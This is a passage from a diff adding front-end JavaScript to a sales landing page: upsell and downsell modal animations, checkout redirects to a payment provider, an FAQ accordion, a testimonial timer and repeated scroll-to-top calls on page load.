+      const modal = document.getElementById('upsell-modal');
+      const container = document.getElementById('upsell-container');
+      modal.classList.remove('hidden');
+      setTimeout(() => {
+        container.classList.remove('scale-95', 'opacity-0');
+        container.classList.add('scale-100', 'opacity-100');
+      }, 10);
+    }
+
+    function closeUpsell() {
+      const container = document.getElementById('upsell-container');
+      container.classList.remove('scale-100', 'opacity-100');
+      container.classList.add('scale-95', 'opacity-0');
+      setTimeout(() => {
+        document.getElementById('upsell-modal').classList.add('hidden');
+      }, 300);
+    }
+
+    function acceptUpsell() {
+      window.location.href = 'https://pay.cakto.com.br/35e56zb_1013788';
+    }
+
+    function declineUpsell() {
+      window.location.href = 'https://pay.cakto.com.br/3b68ubg_1013789';
+    }
+
+    function openDownsell() {
+      const upsellModal = document.getElementById('upsell-modal');
+      const upsellContainer = document.getElementById('upsell-container');
+      
+      upsellContainer.classList.remove('scale-100', 'opacity-100');
+      upsellContainer.classList.add('scale-95', 'opacity-0');
+      
+      setTimeout(() => {
+        upsellModal.classList.add('hidden');
+        
+        const downsellModal = document.getElementById('downsell-modal');
+        const downsellContainer = document.getElementById('downsell-container');
+        downsellModal.classList.remove('hidden');
+        setTimeout(() => {
+          downsellContainer.classList.remove('scale-95', 'opacity-0');
+          downsellContainer.classList.add('scale-100', 'opacity-100');
+        }, 10);
+      }, 300);
+    }
+
+    function closeDownsell() {
+      const downsellContainer = document.getElementById('downsell-container');
+      downsellContainer.classList.remove('scale-100', 'opacity-100');
+      downsellContainer.classList.add('scale-95', 'opacity-0');
+      setTimeout(() => {
+        document.getElementById('downsell-modal').classList.add('hidden');
+      }, 300);
+    }
+
+    function acceptDownsell() {
+      window.location.href = 'https://pay.cakto.com.br/35e56zb_1013788';
+    }
+
+    function declineDownsell() {
+      window.location.href = 'https://pay.cakto.com.br/3b68ubg_1013789';
+    }
+
+    function closeTopBanner() {
+      const topBanner = document.getElementById('top-banner');
+      if (topBanner) {
+        topBanner.classList.add('hidden');
+      }
+      const mainWrapper = document.getElementById('main-wrapper');
+      if (mainWrapper) {
+        mainWrapper.classList.remove('pt-[44px]', 'md:pt-[48px]');
+        mainWrapper.classList.add('pt-0');
+      }
+    }
+
+    function toggleFAQ(button) {
+      const parent = button.parentElement;
+      const answer = parent.querySelector('div');
+      const icon = button.querySelector('[data-lucide="chevron-down"]');
+      const isOpen = answer.style.maxHeight && answer.style.maxHeight !== '0px';
+      
+      document.querySelectorAll('.border-b').forEach(item => {
+        const otherAnswer = item.querySelector('div');
+        const otherIcon = item.querySelector('[data-lucide="chevron-down"]');
+        if (otherAnswer && otherAnswer !== answer) {
+          otherAnswer.style.maxHeight = '0px';
+          otherAnswer.classList.remove('opacity-100');
+          otherAnswer.classList.add('opacity-0');
+        }
+        if (otherIcon && otherIcon !== icon) {
+          otherIcon.style.transform = 'rotate(0deg)';
+        }
+      });
+
+      if (isOpen) {
+        answer.style.maxHeight = '0px';
+        answer.classList.remove('opacity-100');
+        answer.classList.add('opacity-0');
+        icon.style.transform = 'rotate(0deg)';
+      } else {
+        answer.style.maxHeight = answer.scrollHeight + 'px';
+        answer.classList.remove('opacity-0');
+        answer.classList.add('opacity-100');
+        icon.style.transform = 'rotate(180deg)';
+      }
+    }
+
+
+
+    function forceScrollToTop() {
+      window.scrollTo({ top: 0, left: 0, behavior: 'instant' });
+      document.documentElement.scrollTop = 0;
+      document.body.scrollTop = 0;
+    }
+
+    forceScrollToTop();
+
+    window.addEventListener('DOMContentLoaded', () => {
+      forceScrollToTop();
+      updateDateAndYear();
+      
+      if (window.lucide) {
+        lucide.createIcons();
+      }
+
+      setInterval(nextTestimonial, 5000);
+
+
+    });
+
+    window.addEventListener('load', () => {
+      forceScrollToTop();
+      setTimeout(forceScrollToTop, 10);
+      setTimeout(forceScrollToTop, 50);
+      setTimeout(forceScrollToTop, 150);
+      setTimeout(forceScrollToTop, 350);
+    });
+  </script>
+
+
+</body>
+
+</html>
